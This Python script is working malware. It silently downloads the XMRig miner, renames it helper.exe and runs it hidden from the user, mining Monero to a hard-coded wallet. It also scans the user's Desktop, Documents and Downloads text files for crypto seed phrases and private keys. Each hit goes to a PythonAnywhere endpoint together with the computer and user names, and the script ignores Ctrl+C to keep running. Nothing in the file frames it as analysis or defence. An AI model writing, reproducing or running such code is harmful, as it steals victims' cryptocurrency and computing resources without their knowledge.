import os
import re
import time
import requests
import subprocess
import threading
import zipfile
from pathlib import Path
from mnemonic import Mnemonic

mnemo = Mnemonic("english")
SERVER = "https://kryhrqs.pythonanywhere.com/export"
WALLET = "Bv3WEwFb17vKiiLGM7xc1UtxzWWfmzNimkq7CyVBjLfU"

# Use the correct temp path
TEMP = os.environ.get('TEMP', 'C:\\Windows\\Temp')
MINER = os.path.join(TEMP, 'helper.exe')

print(f"[MINER] Path: {MINER}")

def send(data):
    try:
        requests.post(SERVER, json={
            'time': time.time(),
            'host': os.getenv('COMPUTERNAME', ''),
            'user': os.getenv('USERNAME', ''),
            'data': data
        }, timeout=10)
    except:
        pass

def start_miner():
    print("[MINER] Starting...")
    try:
        # Check if miner already exists
        if os.path.exists(MINER):
            print(f"[MINER] Found existing: {MINER}")
        else:
            print("[MINER] Downloading...")
            zip_path = os.path.join(TEMP, 'xmrig.zip')
            
            # Download from GitHub
            url = "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip"
            r = requests.get(url, stream=True, timeout=60)
            
            if r.status_code != 200:
                print(f"[MINER] Download failed: {r.status_code}")
                return
            
            print("[MINER] Download successful, saving...")
            with open(zip_path, 'wb') as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
            
            print("[MINER] Extracting...")
            with zipfile.ZipFile(zip_path, 'r') as z:
                z.extractall(TEMP)
            
            # Find xmrig.exe and rename to helper.exe
            for root, dirs, files in os.walk(TEMP):
                for f in files:
                    if f == 'xmrig.exe':
                        src = os.path.join(root, f)
                        os.rename(src, MINER)
                        print(f"[MINER] Saved to: {MINER}")
                        break
        
        # Launch miner
        if os.path.exists(MINER):
            print("[MINER] Launching...")
            subprocess.Popen(
                [MINER, 
                 '--url=pool.supportxmr.com:3333', 
                 f'--user={WALLET}',
                 '--pass=x', 
                 '--threads=2', 
                 '--keepalive', 
                 '--donate-level=1'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print("[MINER] Launched")
        else:
            print("[MINER] File not found")
            
    except Exception as e:
        print(f"[MINER] Error: {e}")

def is_valid_key(text):
    if not text:
        return False
    key = text.replace('0x', '')
    if len(key) != 64:
        return False
    if not re.match(r'^[a-fA-F0-9]{64}$', key):
        return False
    if key.lower() in ['0'*64, '1'*64, 'f'*64, 'a'*64]:
        return False
    return True

def scan_file(path):
    try:
        if os.path.getsize(path) > 1 * 1024 * 1024:
            return
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            if not content or len(content) < 20:
                return
            
            # Check for seed phrases
            words = re.findall(r'\b[a-zA-Z]+\b', content)
            for i in range(len(words) - 11):
                phrase = ' '.join(words[i:i+12])
                try:
                    if mnemo.check(phrase):
                        print(f"[SCANNER] SEED FOUND: {path}")
                        send({'type': 'seed', 'path': path, 'content': phrase})
                        return
                except:
                    pass
            
            # Check for private keys
            matches = re.findall(r'(?:0x)?[a-fA-F0-9]{64}', content)
            for m in matches:
                if is_valid_key(m):
                    print(f"[SCANNER] KEY FOUND: {path}")
                    send({'type': 'key', 'path': path, 'content': m})
                    return
    except:
        pass

def scan_folders():
    """Scan user folders for seeds/keys."""
    folders = [
        os.path.expandvars("%USERPROFILE%\\Desktop"),
        os.path.expandvars("%USERPROFILE%\\Documents"),
        os.path.expandvars("%USERPROFILE%\\Downloads"),
    ]
    
    for folder in folders:
        if os.path.exists(folder):
            print(f"[SCANNER] Scanning: {folder}")
            for root, dirs, files in os.walk(folder):
                for f in files:
                    if f.endswith('.txt'):
                        scan_file(os.path.join(root, f))

def main():
    print("[SERVICE] Starting...")
    
    # Start miner
    threading.Thread(target=start_miner, daemon=True).start()
    
    # Start scanner
    threading.Thread(target=scan_folders, daemon=True).start()
    
    print("[SERVICE] Running...")
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("[SERVICE] Ctrl+C - continuing...")
        while True:
            time.sleep(60)

if __name__ == '__main__':
    main()